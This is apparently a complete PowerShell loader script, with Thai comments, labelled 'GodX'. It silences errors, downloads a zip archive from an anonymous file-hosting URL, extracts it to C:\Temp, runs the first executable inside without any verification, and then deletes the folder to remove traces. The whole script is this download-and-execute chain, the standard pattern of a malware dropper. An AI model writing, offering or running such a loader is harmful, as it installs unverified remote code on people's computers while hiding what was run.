# ปิดแจ้งเตือน
$ErrorActionPreference = 'SilentlyContinue'

# 1. กำหนดชื่อไฟล์และ Path
$zipUrl = "https://files.catbox.moe/afb9rh.zip"
$tempDir = "C:\Temp\GodX"
$zipPath = "$tempDir\GodX.zip"

# 2. เตรียมโฟลเดอร์
if (Test-Path $tempDir) { Remove-Item $tempDir -Recurse -Force }
New-Item -ItemType Directory -Path $tempDir | Out-Null

# 3. โหลดและแตกไฟล์
$wc = New-Object System.Net.WebClient
$wc.DownloadFile($zipUrl, $zipPath)

Add-Type -AssemblyName System.IO.Compression.FileSystem
[System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, $tempDir)

# 4. หารัน .exe โดยใช้ Path เต็ม
$targetExe = Get-ChildItem -Path $tempDir -Filter "*.exe" | Select-Object -First 1

if ($targetExe) {
    # ใช้ start-process พร้อม working directory ที่ถูกต้อง
    $p = Start-Process -FilePath $targetExe.FullName -WorkingDirectory $tempDir -PassThru
    $p.WaitForExit()
}

# 5. ลบขยะทิ้ง
Remove-Item $tempDir -Recurse -Force
